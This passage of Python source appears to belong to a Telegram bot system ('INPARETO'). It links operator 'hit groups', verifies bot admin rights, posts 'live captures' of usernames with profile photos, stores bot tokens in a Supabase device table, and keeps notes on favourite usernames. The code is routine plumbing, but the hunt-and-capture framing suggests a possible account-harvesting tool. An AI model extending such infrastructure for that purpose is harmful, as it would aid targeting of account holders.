    col = column.lower()
    return col in text and (
        "pgrst204" in text
        or "could not find" in text
        or "schema cache" in text
    )


def resolve_hit_group_owner(record):
    if record:
        cloud_owner = str(record.get("operator_hit_group_operator_id") or "").strip()
        if cloud_owner:
            return cloud_owner
    return read_local_hit_group_owner()


def _post_devices_row(payload, *, prefer="resolution=merge-duplicates"):
    """POST devices upsert; retry without owner column if Supabase schema lacks it."""
    url = f"{SUPABASE_URL}/rest/v1/devices?on_conflict=device_hash"
    headers = supabase_headers(prefer)
    body = dict(payload)
    try:
        response = requests.post(
            url, headers=headers, json=body, timeout=CLOUD_TIMEOUT,
        )
        if response.ok:
            return None
        err = response.text[:400]
        if _supabase_missing_column(err, "operator_hit_group_operator_id"):
            mark_cloud_no_hit_group_owner_column()
            body.pop("operator_hit_group_operator_id", None)
            response = requests.post(
                url, headers=headers, json=body, timeout=CLOUD_TIMEOUT,
            )
            if response.ok:
                return None
            return response.text[:200]
        return err[:200]
    except Exception as exc:
        return str(exc)[:120]


def get_operator_bot_id(bot_token=None):
    token = (bot_token or TELEGRAM_BOT_TOKEN or "").strip()
    if not token:
        return None
    if token in _operator_bot_id_cache:
        return _operator_bot_id_cache[token]
    response, err = operator_bot_api_post(token, "getMe")
    if err or not response or not response.ok:
        return None
    try:
        bot_id = response.json().get("result", {}).get("id")
    except Exception:
        return None
    if bot_id:
        _operator_bot_id_cache[token] = bot_id
    return bot_id


def refresh_operator_hit_group_cache():
    return reconcile_operator_hit_group()


def get_operator_hit_group_id():
    global _cached_hit_group_id
    local_gid = read_local_hit_group_id()
    if local_gid:
        owner = read_local_hit_group_owner()
        current = str(resolve_operator_telegram_id() or "").strip()
        if owner and current and owner != current:
            clear_local_hit_group_id()
            clear_local_hit_group_owner()
            _cached_hit_group_id = None
        else:
            if current and not owner:
                persist_local_hit_group_owner(current)
        _cached_hit_group_id = local_gid
        return local_gid
    if _cached_hit_group_id:
        return _cached_hit_group_id
    if has_local_operator_session() and is_cloud_enabled():
        chat_id = resolve_operator_telegram_id()
        if chat_id:
            inherited = fetch_operator_hit_group_id_for_telegram_user(chat_id)
            if inherited:
                persist_local_hit_group_id(inherited)
                persist_local_hit_group_owner(chat_id)
                _cached_hit_group_id = inherited
                return inherited
    if _cached_hit_group_id is None:
        refresh_operator_hit_group_cache()
    return _cached_hit_group_id or None


def update_device_fields(device_hash, **fields):
    if not is_cloud_enabled():
        return "Cloud offline"
    device_hash = (device_hash or "").strip()
    if not device_hash:
        return "No device hash"
    existing, err = fetch_device_record(device_hash)
    if err:
        return err
    if not existing:
        return "No device record"

    owner_in = fields.get("operator_hit_group_operator_id")
    if owner_in:
        persist_local_hit_group_owner(owner_in)
    if fields.get("operator_hit_group_id") is None and "operator_hit_group_id" in fields:
        clear_local_hit_group_id()
        clear_local_hit_group_owner()

    payload = {"device_hash": device_hash}
    allowed = (
        "telegram_bot_token",
        "telegram_chat_id",
        "display_name",
        "hostname",
        "api_host",
        "api_public_ip",
        "api_port",
        "operator_hit_group_id",
        "operator_hit_group_operator_id",
    )
    for key in allowed:
        if key == "operator_hit_group_operator_id" and not cloud_supports_hit_group_owner_column():
            continue
        if key in fields:
            payload[key] = fields[key]
        elif existing.get(key) is not None:
            payload[key] = existing[key]

    post_err = _post_devices_row(payload)
    if post_err:
        return _parse_supabase_error(post_err)
    if device_hash == DEVICE_HASH and (
        "operator_hit_group_id" in fields
        or "operator_hit_group_operator_id" in fields
    ):
        refresh_operator_hit_group_cache()
    return None


def set_operator_hit_group_id(group_id):
    gid = str(group_id or "").strip()
    owner = resolve_operator_telegram_id()
    if not gid or not owner:
        return "No group or Telegram ID"
    persist_local_hit_group_id(gid)
    persist_local_hit_group_owner(owner)
    global _cached_hit_group_id
    _cached_hit_group_id = gid
    invalidate_operator_gate_cache()

    def _cloud_hit_group_sync():
        user_hit_group_set(owner, gid)

    threading.Thread(target=_cloud_hit_group_sync, daemon=True, name="hg-cloud").start()
    return None


def clear_operator_hit_group_id():
    owner = resolve_operator_telegram_id()
    clear_local_hit_group_id()
    clear_local_hit_group_owner()
    global _cached_hit_group_id
    _cached_hit_group_id = None
    invalidate_operator_gate_cache()
    if owner:
        user_hit_group_clear(owner)
    if not owner or not is_cloud_enabled():
        return
    data, _ = supabase_request(
        "GET",
        "devices",
        params={
            "telegram_chat_id": f"eq.{owner}",
            "select": "device_hash",
            "limit": "25",
        },
    )
    for row in data or []:
        dh = str(row.get("device_hash") or "").strip()
        if not dh or dh.endswith("-OUT"):
            continue
        patch = {"operator_hit_group_id": None}
        if cloud_supports_hit_group_owner_column():
            patch["operator_hit_group_operator_id"] = None
        update_device_fields(dh, **patch)


def operator_bot_chat_member_status(group_id, bot_token=None):
    token = (bot_token or TELEGRAM_BOT_TOKEN or "").strip()
    bot_id = get_operator_bot_id(token)
    if not bot_id or not group_id:
        return None, "missing bot or group"
    response, err = operator_bot_api_post(
        token,
        "getChatMember",
        {"chat_id": str(group_id), "user_id": bot_id},
        timeout=HIT_GROUP_MEMBER_TIMEOUT,
    )
    if err:
        return None, err
    if not response or not response.ok:
        return None, (response.text[:80] if response else "getChatMember failed")
    try:
        return response.json().get("result", {}), None
    except Exception as exc:
        return None, str(exc)[:60]


def mark_hit_group_verified_by_delivery():
    """Successful hit post proves the bot can message the linked group."""
    global _hit_group_last_delivery_at
    gid = get_operator_hit_group_id()
    if not gid:
        return
    _hit_group_last_delivery_at = time.time()
    _hit_group_admin_cache.update(gid=str(gid), ok=True, at=time.time())
    mark_operator_access_verified()
    invalidate_operator_gate_cache()
    dismiss_hit_group_gate_messages()


def hit_group_recently_delivered(within_sec=7200):
    return (
        _hit_group_last_delivery_at > 0
        and time.time() - _hit_group_last_delivery_at < within_sec
    )


def operator_bot_is_group_admin(group_id, bot_token=None):
    member, err = operator_bot_chat_member_status(group_id, bot_token)
    if err:
        log_event("HITGRP MEMBER", str(err)[:80])
        return False
    if not member:
        return False
    status = member.get("status", "")
    if status == "creator":
        return True
    if status == "administrator":
        if member.get("is_anonymous"):
            return False
        post = member.get("can_post_messages")
        if post is True:
            return True
        if post is False:
            return bool(
                member.get("can_manage_chat")
                or member.get("can_change_info")
                or member.get("can_delete_messages")
                or member.get("can_pin_messages")
                or member.get("can_invite_users")
                or member.get("can_manage_topics")
            )
        # Supergroups often omit can_post_messages; bot can still send hits.
        return True
    return False


def apply_operator_hit_group_branding(group_id, bot_token=None):
    """Apply admin-defined title, description & photo to an operator hit group."""
    admin_load_settings()
    token = (bot_token or TELEGRAM_BOT_TOKEN or "").strip()
    gid = str(group_id or "").strip()
    if not token or not gid:
        return False, "No bot token or group id"

    title = (_admin_settings.get("operator_hit_group_title") or "").strip()
    desc = (_admin_settings.get("operator_hit_group_description") or "").strip()
    photo_url = (_admin_settings.get("operator_hit_group_photo_url") or "").strip()
    steps = []
    errors = []

    if title:
        response, err = operator_bot_api_post(
            token, "setChatTitle", {"chat_id": gid, "title": title[:128]},
        )
        if err:
            errors.append(f"title: {err}")
        elif response and response.ok:
            steps.append("title")
        else:
            errors.append(f"title: {(response.text[:80] if response else 'failed')}")

    if desc:
        response, err = operator_bot_api_post(
            token, "setChatDescription", {"chat_id": gid, "description": desc[:255]},
        )
        if err:
            errors.append(f"desc: {err}")
        elif response and response.ok:
            steps.append("description")
        else:
            errors.append(f"desc: {(response.text[:80] if response else 'failed')}")

    if photo_url:
        try:
            image_response = session.get(photo_url, timeout=20)
            if not image_response.ok or not image_response.content:
                errors.append("photo: download failed")
            else:
                content_type = image_response.headers.get("Content-Type", "image/jpeg")
                ext = "jpg" if "png" not in content_type.lower() else "png"
                files = {"photo": (f"group.{ext}", image_response.content, content_type)}
                response, err = operator_bot_api_post(
                    token, "setChatPhoto", {"chat_id": gid}, files=files,
                )
                if err:
                    errors.append(f"photo: {err}")
                elif response and response.ok:
                    steps.append("photo")
                else:
                    errors.append(f"photo: {(response.text[:80] if response else 'failed')}")
        except Exception as exc:
            errors.append(f"photo: {str(exc)[:60]}")

    if not steps and not errors:
        return False, "No hit-group branding configured (use /set opgrouptitle …)"
    if errors and not steps:
        return False, "; ".join(errors)
    detail = ", ".join(steps)
    if errors:
        detail += f" · warnings: {'; '.join(errors)}"
    return True, detail


def rebrand_all_operator_hit_groups():
    devices, err = admin_fetch_all_devices()
    if err:
        return f"Hit groups: failed — {err}"
    groups = {}
    for row in devices:
        gid = str(row.get("operator_hit_group_id") or "").strip()
        token = (row.get("telegram_bot_token") or "").strip()
        if gid and token:
            groups[(gid, token)] = True
    if not groups:
        return "Hit groups: none linked yet."
    ok_count = 0
    fail = []
    for (gid, token) in groups:
        success, msg = apply_operator_hit_group_branding(gid, token)
        if success:
            ok_count += 1
        else:
            fail.append(msg[:40])
    line = f"Hit groups: rebranded {ok_count}/{len(groups)}."
    if fail:
        line += f" Fail: {fail[0]}"
    return line


def invalidate_operator_gate_cache():
    _operator_gate_cache["ok"] = None
    _operator_gate_cache["at"] = 0.0
    _hit_group_admin_cache["ok"] = None
    _hit_group_admin_cache["at"] = 0.0


def mark_operator_access_verified():
    global _operator_access_sticky_until, _access_trust_ok_at
    now = time.time()
    _operator_access_sticky_until = now + OPERATOR_ACCESS_STICKY_SEC
    _access_trust_ok_at = now
    persist_operator_session_verified()


def _access_trust_grace_active():
    """Keep hunt/bot alive through short cloud/TG outages after a verified session."""
    if operator_access_sticky_active():
        return True
    return (time.time() - float(_access_trust_ok_at or 0)) < ACCESS_TRUST_GRACE_SEC


def operator_access_sticky_active():
    return time.time() < _operator_access_sticky_until


def operator_hit_group_access_state(*, force=False):
    """Hit group gate keyed by Telegram id + local .inpareto_hit_group file."""
    if force or not get_operator_hit_group_id():
        reconcile_operator_hit_group()
    gid = get_operator_hit_group_id()
    if not gid:
        return False, "no_hit_group"
    now = time.time()
    if (
        not force
        and _hit_group_admin_cache["gid"] == str(gid)
        and _hit_group_admin_cache["ok"] is not None
        and now - _hit_group_admin_cache["at"] < HIT_GROUP_ADMIN_TTL
    ):
        if _hit_group_admin_cache["ok"]:
            return True, None
        if hit_group_recently_delivered():
            mark_hit_group_verified_by_delivery()
            return True, None
        return False, "not_admin"
    is_admin = operator_bot_is_group_admin(gid)
    if not is_admin and (
        hit_group_recently_delivered()
        or operator_access_sticky_active()
    ):
        is_admin = True
    _hit_group_admin_cache.update(gid=str(gid), ok=is_admin, at=now)
    if not is_admin:
        return False, "not_admin"
    return True, None


def format_hit_group_gate_message(reason="no_hit_group"):
    lines = [
        format_panel_header(),
        f"<b>{S['brand']} Hit Group Required</b>\n\n",
        "<i>Captures post to your private hit group — not this DM inbox.</i>\n"
        "<i>Required for every operator, including admins.</i>\n\n",
    ]
    if reason == "not_admin":
        gid = get_operator_hit_group_id() or "—"
        lines.append(
            "<b>Bot needs admin rights in your hit group.</b>\n\n"
            f"  {S['bullet']} Open the group → bot → <b>Promote to admin</b>\n"
            f"  {S['bullet']} Enable <b>Post messages</b> and <b>Change group info</b>\n"
            f"  {S['bullet']} Linked group: <code>{html.escape(str(gid))}</code>\n\n"
            "<i>If hits already appear in that group, tap <b>Verify hit group</b> below "
            "or send <code>/verifyhitgroup</code> — detection will refresh.</i>\n"
        )
    else:
        lines.append(
            "<b>Create a Telegram group and add your operator bot.</b>\n\n"
            f"  {S['bullet']} New group → add <b>your</b> @BotFather bot\n"
            f"  {S['bullet']} Promote the bot to <b>admin</b> immediately\n"
            f"  {S['bullet']} Only you (this account) should add the bot\n\n"
            "<i>/hitgroup or /verifyhitgroup here in the group, or in bot DM</i>\n"
        )
    lines.append(f"<i>Channel: {admin_channel_tag()}</i>")
    return "".join(lines)


def hit_group_gate_keyboard():
    return {"inline_keyboard": [[{"text": "Verify hit group", "callback_data": "VERIFY_HITGROUP"}]]}


def format_hit_group_setup_message():
    gid = get_operator_hit_group_id()
    ok, reason = operator_hit_group_access_state(force=True)
    if not gid:
        state = "not linked"
    elif ok:
        state = "verified · bot can post"
    elif reason == "not_admin":
        state = "linked · promote bot to admin"
    else:
        state = f"linked · {reason}"
    return (
        format_panel_header()
        + f"<b>{S['btn_hits']} Your Hit Group</b>\n\n"
        + "<i>All live captures are delivered here — not to your private chat.</i>\n\n"
        + tg_row("Linked group", gid if gid else "—")
        + tg_row("Status", state)
        + "\n<b>Setup</b>\n"
        + f"  {S['bullet']} Create a group · add your operator bot\n"
        + f"  {S['bullet']} Promote bot to <b>admin</b> (post + change info)\n"
        + f"  {S['bullet']} Send <code>/verifyhitgroup</code> <b>in the hit group</b> (best) or here in DM\n"
        + f"  {S['bullet']} Group privacy ON → <code>/verifyhitgroup@YourBot</code>\n"
        + f"  {S['bullet']} <code>/setgroup</code> = same as <code>/hitgroup</code>\n\n"
        + "<i>Linked ≠ verified — run verify after promoting the bot.</i>"
    )


def _is_hit_group_gate_text(text):
    return bool(text and "Hit Group Required" in text)


def register_hit_group_gate_message(response):
    mid = telegram_sent_message_id(response)
    if not mid:
        return
    with _hit_group_gate_lock:
        ids = _hit_group_gate_state["message_ids"]
        if mid not in ids:
            ids.append(mid)
        _hit_group_gate_state["message_ids"] = ids[-10:]
        _hit_group_gate_state["last_edit_id"] = mid


def dismiss_hit_group_gate_messages(except_message_id=None):
    """Remove stacked 'Hit group required' prompts after successful verify."""
    if not TELEGRAM_ENABLED or not TELEGRAM_CHAT_ID:
        return
    except_id = int(except_message_id) if except_message_id else None
    with _hit_group_gate_lock:
        ids = list(_hit_group_gate_state["message_ids"])
        _hit_group_gate_state["message_ids"].clear()
        _hit_group_gate_state["last_edit_id"] = None
    for mid in ids:
        if except_id is not None and mid == except_id:
            continue
        delete_telegram_message(TELEGRAM_CHAT_ID, mid)


def send_hit_group_gate_reply(text, reply_markup=None, *, force=False):
    """One gate banner: edit in place when possible, throttle duplicate sends."""
    if not TELEGRAM_ENABLED:
        return None
    target_chat = operator_reply_chat_id()
    now = time.time()
    with _hit_group_gate_lock:
        last_at = _hit_group_gate_state["last_send_at"]
        edit_id = _hit_group_gate_state["last_edit_id"]
    if edit_id and str(target_chat) == str(TELEGRAM_CHAT_ID or ""):
        resp = edit_telegram_message(
            TELEGRAM_CHAT_ID, edit_id, text, reply_markup=reply_markup,
        )
        if _telegram_api_ok(resp):
            with _hit_group_gate_lock:
                _hit_group_gate_state["last_send_at"] = now
            return resp
    if not force and now - last_at < HIT_GROUP_GATE_SEND_COOLDOWN:
        return send_telegram_text(text, reply_markup=reply_markup, chat_id=target_chat)
    resp = send_telegram_text(text, reply_markup=reply_markup, chat_id=target_chat)
    register_hit_group_gate_message(resp)
    with _hit_group_gate_lock:
        _hit_group_gate_state["last_send_at"] = now
    return resp


def notify_operator_setup(text):
    if not TELEGRAM_ENABLED or not TELEGRAM_CHAT_ID:
        return
    if _is_hit_group_gate_text(text):
        send_hit_group_gate_reply(text, hit_group_gate_keyboard())
        return
    send_telegram_text(text)


def process_operator_hit_group_link(group_id, actor_id, bot_token=None):
    """Save group, warn if not admin, apply branding when ready (never blocks poll)."""
    if not can_control_operator_bot(actor_id):
        return

    def _link_work():
        err = set_operator_hit_group_id(group_id)
        if err:
            notify_operator_setup(
                format_action_notice("Hit group save failed", err[:200], "ERR"),
            )
            return
        if operator_bot_is_group_admin(group_id, bot_token):
            threading.Thread(
                target=_branding_hit_group_async,
                args=(group_id,),
                daemon=True,
                name="hg-brand-link",
            ).start()
            detail = (
                f"Group {tg_code(group_id)} linked.\n"
                "<i>Branding applies in the background if configured.</i>"
            )
            dismiss_hit_group_gate_messages()
            notify_operator_setup(
                format_action_notice("Hit group ready", detail, "OK", detail_html=True),
            )
            threading.Thread(
                target=sync_operator_access, daemon=True, name="hg-sync",
            ).start()
        else:
            notify_operator_setup(
                format_hit_group_gate_message("not_admin"),
            )

    threading.Thread(target=_link_work, daemon=True, name="hg-link").start()


def handle_operator_my_chat_member(update):
    mcm = update.get("my_chat_member") or {}
    chat = mcm.get("chat") or {}
    chat_type = chat.get("type", "")
    if chat_type not in ("group", "supergroup"):
        return
    group_id = chat.get("id")
    if not group_id:
        return
    actor_id = str((mcm.get("from") or {}).get("id", ""))
    new_member = mcm.get("new_chat_member") or {}
    old_member = mcm.get("old_chat_member") or {}
    new_status = new_member.get("status", "")
    old_status = old_member.get("status", "")

    if new_status in ("left", "kicked"):
        if str(get_operator_hit_group_id() or "") == str(group_id):
            clear_operator_hit_group_id()
            notify_operator_setup(
                format_action_notice(
                    "Hit group unlinked",
                    "Bot removed from your hit group. Add it again to resume captures.",
                    "WARN",
                ),
            )
            sync_operator_access()
        return

    if new_status in ("member", "administrator", "creator"):
        if old_status in ("left", "kicked", "") or old_status != new_status:
            process_operator_hit_group_link(group_id, actor_id)


def _branding_hit_group_async(group_id):
    gid = str(group_id or get_operator_hit_group_id() or "").strip()
    if not gid:
        return
    try:
        apply_operator_hit_group_branding(gid)
    except Exception as exc:
        log_event("HITGRP BRAND", str(exc)[:80])


def verify_operator_hit_group_access(*, keep_message_id=None, fast=False, group_id=None):
    """Verify bot admin in hit group. fast=True: one Telegram call, defer cloud/cleanup."""
    global _cached_hit_group_id
    if not fast:
        invalidate_operator_gate_cache()
    gid = str(group_id or read_local_hit_group_id() or _cached_hit_group_id or "").strip()
    if not gid and not group_id:
        gid = str(get_operator_hit_group_id() or "").strip()
    if group_id and str(group_id) != str(get_operator_hit_group_id() or ""):
        persist_local_hit_group_id(group_id)
        persist_local_hit_group_owner(resolve_operator_telegram_id())
        _cached_hit_group_id = str(group_id)
        gid = str(group_id)

    if fast and gid:
        is_admin = operator_bot_is_group_admin(gid)
        if not is_admin and (
            hit_group_recently_delivered()
            or operator_access_sticky_active()
        ):
            is_admin = True
        now = time.time()
        _hit_group_admin_cache.update(gid=str(gid), ok=is_admin, at=now)
        if not is_admin:
            return False, format_hit_group_gate_message("not_admin")

        def _verify_followup():
            try:
                dismiss_hit_group_gate_messages(except_message_id=keep_message_id)
                sync_operator_access()
                if not paused:
                    pause_event.set()
            except Exception as exc:
                log_event("HG VERIFY", str(exc)[:80])

        mark_operator_access_verified()
        persist_local_hit_group_id(gid)
        threading.Thread(target=_verify_followup, daemon=True, name="hg-verify").start()
        threading.Thread(target=_branding_hit_group_async, args=(gid,), daemon=True).start()
        threading.Thread(
            target=lambda: set_operator_hit_group_id(gid),
            daemon=True,
            name="hg-cloud",
        ).start()
        return True, "Hit group verified — captures will post there."

    if hit_group_recently_delivered():
        mark_hit_group_verified_by_delivery()
    ok, reason = operator_hit_group_access_state(force=True)
    if ok:
        def _slow_followup():
            try:
                dismiss_hit_group_gate_messages(except_message_id=keep_message_id)
                sync_operator_access()
            except Exception as exc:
                log_event("HG VERIFY", str(exc)[:80])

        gid = get_operator_hit_group_id() or gid
        if gid:
            persist_local_hit_group_id(gid)
        mark_operator_access_verified()
        threading.Thread(target=_slow_followup, daemon=True, name="hg-verify").start()
        threading.Thread(target=_branding_hit_group_async, args=(gid,), daemon=True).start()
        return True, "Hit group verified — captures will post there."
    if reason == "not_admin":
        gid = get_operator_hit_group_id() or gid
        if gid and operator_bot_is_group_admin(gid):
            mark_operator_access_verified()
            persist_local_hit_group_id(gid)
            threading.Thread(
                target=lambda: dismiss_hit_group_gate_messages(except_message_id=keep_message_id),
                daemon=True,
            ).start()
            threading.Thread(target=sync_operator_access, daemon=True).start()
            threading.Thread(target=_branding_hit_group_async, args=(gid,), daemon=True).start()
            return True, "Admin rights confirmed — hit group is ready."
        return False, format_hit_group_gate_message("not_admin")
    return False, format_hit_group_gate_message("no_hit_group")


def deliver_hit_to_operator_group(caption, hit_keyboard, photo_bytes=None, content_type="image/jpeg"):
    """Post capture to the operator's linked hit group (not DM inbox). Returns (ok, message_id, is_photo)."""
    if not TELEGRAM_ENABLED:
        return False, None, False
    group_id = get_operator_hit_group_id()
    if not group_id:
        return False, None, False

    safe_kb = sanitize_inline_keyboard_urls(hit_keyboard)
    if photo_bytes:
        data = {
            "chat_id": group_id,
            "caption": caption,
            "parse_mode": "HTML",
        }
        if safe_kb:
            data["reply_markup"] = json.dumps(safe_kb)
        data = telegram_disable_link_preview(data, "sendPhoto")
        files = {"photo": ("profile.jpg", photo_bytes, content_type)}
        resp = telegram_post_with_retries(
            "sendPhoto",
            data=data,
            files=files,
            timeout=max(TIMEOUT, TG_SEND_TIMEOUT),
            max_retries=TG_HIT_MAX_RETRIES,
            label="HIT GRP PHOTO",
        )
        if resp is not None:
            mark_hit_group_verified_by_delivery()
            return True, _parse_tg_message_id(resp), True
        log_event("HIT GRP", "photo send failed — falling back to text")

    text_data = {
        "chat_id": group_id,
        "text": caption,
        "parse_mode": "HTML",
    }
    if safe_kb:
        text_data["reply_markup"] = json.dumps(safe_kb)
    text_data = telegram_disable_link_preview(text_data, "sendMessage")
    resp = telegram_post_with_retries(
        "sendMessage",
        data=text_data,
        timeout=max(TIMEOUT, TG_SEND_TIMEOUT),
        max_retries=TG_HIT_MAX_RETRIES,
        label="HIT GRP MSG",
    )
    if resp is not None:
        mark_hit_group_verified_by_delivery()
        return True, _parse_tg_message_id(resp), False
    return False, None, bool(photo_bytes)


def is_favorite_username(username):
    uname = (username or "").strip().lstrip("@").lower()
    if not uname:
        return False
    with profile_lock:
        profile = load_profile_data()
    favs = [str(u).lstrip("@").lower() for u in (profile.get("favorites") or [])]
    return uname in favs


def normalize_favorite_username(username):
    return str(username or "").strip().lstrip("@")


def _favorite_notes_local_path():
    return os.path.join(_device_state_dir(), ".inpareto_favorite_notes.json")


def load_local_favorite_notes():
    data = _read_local_state_json(_favorite_notes_local_path())
    if not data:
        return {}
    try:
        return {
            str(k).lstrip("@").lower(): str(v)[:FAV_NOTE_MAX_LEN]
            for k, v in data.items()
            if v
        }
    except (TypeError, ValueError):
        return {}


def persist_local_favorite_notes(notes):
    clean = {
        str(k).lstrip("@").lower(): str(v)[:FAV_NOTE_MAX_LEN]
        for k, v in (notes or {}).items()
        if v
    }
    _write_local_state_json(_favorite_notes_local_path(), clean)


def get_favorite_notes_map(profile=None):
    if profile is None:
        with profile_lock:
            profile = load_profile_data()
    notes = dict(profile.get("favorite_notes") or {})
    notes.update(load_local_favorite_notes())
    return notes


def get_favorite_note_for_user(username, profile=None):
    key = normalize_favorite_username(username).lower()
    if not key:
        return ""
    return (get_favorite_notes_map(profile).get(key) or "").strip()


def set_favorite_note(username, note):
    uname = normalize_favorite_username(username)
    if not uname:
        return False
    key = uname.lower()
    with profile_lock:
        profile = load_profile_data()
        notes = dict(get_favorite_notes_map(profile))
        text = (note or "").strip()
        if text:
            notes[key] = text[:FAV_NOTE_MAX_LEN]
        else:
            notes.pop(key, None)
        profile["favorite_notes"] = notes
        save_profile_data(profile)
    persist_local_favorite_notes(notes)
    sync_favorites_txt(profile)
    return True


def clear_favorite_note_for_user(username):
    return set_favorite_note(username, None)


def set_fav_note_pending(username):
    uname = normalize_favorite_username(username)
    with _fav_note_pending_lock:
        _fav_note_pending["username"] = uname or None


def get_fav_note_pending():
    with _fav_note_pending_lock:
        return _fav_note_pending.get("username")


def clear_fav_note_pending():
    with _fav_note_pending_lock:
        _fav_note_pending["username"] = None


def favorite_note_prompt_keyboard(username):
    uname = normalize_favorite_username(username)[:48]
    return {
        "inline_keyboard": [[
            {"text": "Yes", "callback_data": f"FAVNOTE_YES:{uname}"},
            {"text": "No", "callback_data": f"FAVNOTE_NO:{uname}"},
        ]],
    }


def send_favorite_note_prompt(username):
    uname = normalize_favorite_username(username)
    if not uname or not TELEGRAM_ENABLED:
        return None
    text = (
        format_panel_header()
        + "<b>★ Added to favorites</b>\n\n"
        + f"You recently added <b>@{html.escape(uname)}</b> to favourites.\n\n"
        + "Do you want to add an additional note to this hit?"
    )
    return send_telegram_text(text, reply_markup=favorite_note_prompt_keyboard(uname))


def try_consume_favorite_note_input(text):
    uname = get_fav_note_pending()
    if not uname:
        return False
    raw = (text or "").strip()
    if not raw:
        return False
    lower = raw.lower()
    if lower in {"/cancel", "cancel"}:
        clear_fav_note_pending()
        bot_command_reply(
            format_action_notice(
                "Note skipped",
                f"No note saved for @{uname}.",
                "INFO",
            ),
        )
        return True
    if raw.startswith("/"):
        return False
    set_favorite_note(uname, raw)
    clear_fav_note_pending()
    bot_command_reply(
        format_action_notice(
            "Note saved",
            f"@{uname}\nAdditional: {html.escape(raw[:FAV_NOTE_MAX_LEN])}",
            "OK",
        ),
    )
    return True


def toggle_favorite_username(username):
    uname = normalize_favorite_username(username)
    if not uname:
        return False, 0
    with profile_lock:
        profile = load_profile_data()
        favs = list(profile.get("favorites") or [])
        lower = [str(u).lstrip("@").lower() for u in favs]
        if uname.lower() in lower:
            favs = [u for u in favs if str(u).lstrip("@").lower() != uname.lower()]
            added = False
            notes = dict(profile.get("favorite_notes") or {})
            notes.pop(uname.lower(), None)
            profile["favorite_notes"] = notes
            persist_local_favorite_notes(notes)
        else:
            favs.append(uname)
            added = True
        profile["favorites"] = sorted({str(u).lstrip("@") for u in favs if u})
        save_profile_data(profile)
        count = len(profile["favorites"])
    sync_favorites_txt(profile)
    return added, count


def favorites_txt_path():
    return "favorites.txt"


def get_saved_favorites():
    with profile_lock:
        profile = load_profile_data()
    return [str(u).lstrip("@") for u in (profile.get("favorites") or []) if u]


def sync_favorites_txt(profile=None):
    """Write cloud/local favorites list to favorites.txt for /saved export."""
    with profile_lock:
        if profile is None:
            profile = load_profile_data()
        favs = [str(u).lstrip("@") for u in (profile.get("favorites") or []) if u]
        notes = dict(profile.get("favorite_notes") or {})
        notes.update(load_local_favorite_notes())
    path = favorites_txt_path()
    stamp = datetime.now(timezone.utc).strftime("%d %b %Y %H:%M UTC")
    lines = [
        "INPARETO — Saved favorites (★ Add to fav on hit alerts)",
        f"Updated: {stamp}",
        f"Count: {len(favs)}",
        "",
    ]
    if favs:
        for u in favs:
            line = f"@{u}"
            note = (notes.get(u.lower()) or "").strip()
            if note:
                line += f"  Additional: {note}"
            lines.append(line)
    else:
        lines.append("(empty)")
        lines.append("")
        lines.append("Tap ★ Add to fav on any hit, then send /saved")
    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(lines) + "\n")
    except OSError as exc:
        log_event("FAV FILE", str(exc)[:80])
    return path


def format_saved_favorites_message():
    favs = get_saved_favorites()
    notes = get_favorite_notes_map()
    if not favs:
        return (
            format_panel_header()
            + "<b>★ Saved Favorites</b>\n\n"
            + "<i>No favorites yet.</i>\n\n"
            + "On a <b>hit alert</b>, tap <b>★ Add to fav</b>.\n"
            + "Then send <code>/saved</code> to get <code>favorites.txt</code>."
        )
    preview_lines = []
    for u in favs[:25]:
        line = f"  {S['bullet']} @{html.escape(u)}"
        note = (notes.get(u.lower()) or "").strip()
        if note:
            line += f"\n      <i>Additional:</i> {html.escape(note[:120])}"
        preview_lines.append(line)
    preview = "\n".join(preview_lines)
    extra = ""
    if len(favs) > 25:
        extra = f"\n  <i>…and {len(favs) - 25} more in the file</i>"
    return (
        format_panel_header()
        + f"<b>★ Saved Favorites</b>  <code>{len(favs)}</code>\n\n"
        + preview
        + extra
        + "\n\n<i>Sending <code>favorites.txt</code>…</i>"
    )


def export_saved_favorites():
    favs = get_saved_favorites()
    if not favs:
        return bot_command_reply(
            format_saved_favorites_message(),
            reply_markup=panel_keyboard("hits"),
        )
    path = sync_favorites_txt()
    if not os.path.isfile(path):
        return bot_command_reply(
            format_action_notice("Saved", "Could not write favorites.txt.", "ERR"),
            reply_markup=panel_keyboard("tools"),
        )
    caption = (
        format_panel_header()
        + f"<b>★ favorites.txt</b>  — {len(favs)} saved\n"
        + "<i>Notes appear as: @user  Additional: … · updates on /saved</i>"
    )
    return send_telegram_document(path, caption=caption)


def rebrand_all_operator_bots():
    devices, err = admin_fetch_all_devices()
    if err:
        return f"Failed: {err}"
    tokens = {
        (row.get("telegram_bot_token") or "").strip()
        for row in devices
        if (row.get("telegram_bot_token") or "").strip()
    }
    if not tokens:
        return "No operator bots in database."
    ok_count = 0
    fail = []
    for token in tokens:
        success, msg = apply_operator_bot_branding(token)
        if success:
            ok_count += 1
        else:
            fail.append(msg[:40])
    return f"Rebranded {ok_count}/{len(tokens)} bots." + (f" Fail: {fail[0]}" if fail else "")


_tg_user_cache = {}
_synced_operator_ids = set()


def is_device_style_name(name):
    if not name:
        return True
    return str(name).startswith("Op-") or str(name).startswith("Device")


def _tg_user_cache_key(chat_id, api_url=None, member_group=None):
    base = (api_url or TELEGRAM_API_URL or "none").rsplit("/", 1)[-1][:24]
    if member_group:
        return f"mem:{member_group}:{chat_id}:{base}"
    return f"chat:{chat_id}:{base}"


def _telegram_user_info_from_dict(data, chat_id):
    first = (data.get("first_name") or "").strip()
    last = (data.get("last_name") or "").strip()
    username = (data.get("username") or "").strip()
    full = " ".join(part for part in (first, last) if part).strip()
    if not full and username:
        full = f"@{username}"
    if not full:
        return None
    return {"display_name": full, "username": username, "id": str(chat_id)}


def _is_placeholder_user_label(name, user_id):
    if not name:
        return True
    label = str(name).strip()
    uid = str(user_id).strip()
    if label in {f"User {uid}", f"User {uid[-6:]}", f"User {uid[-4:]}"}:
        return True
    return label.startswith("User ") and uid in label


def fetch_telegram_user(chat_id, api_url=None):
    chat_id = str(chat_id).strip()
    if not chat_id:
        return None
    api = api_url or TELEGRAM_API_URL
    if not api:
        return None
    cache_key = _tg_user_cache_key(chat_id, api)
    if cache_key in _tg_user_cache:
        return _tg_user_cache.get(cache_key)
    try:
        response = requests.get(
            f"{api}/getChat",
            params={"chat_id": chat_id},
            timeout=8,
        )
        if not response.ok:
            _tg_user_cache[cache_key] = None
            return None
        info = _telegram_user_info_from_dict(response.json().get("result") or {}, chat_id)
        _tg_user_cache[cache_key] = info
        return info
    except Exception as exc:
        log_event("TG USER", str(exc)[:80])
        _tg_user_cache[cache_key] = None
        return None


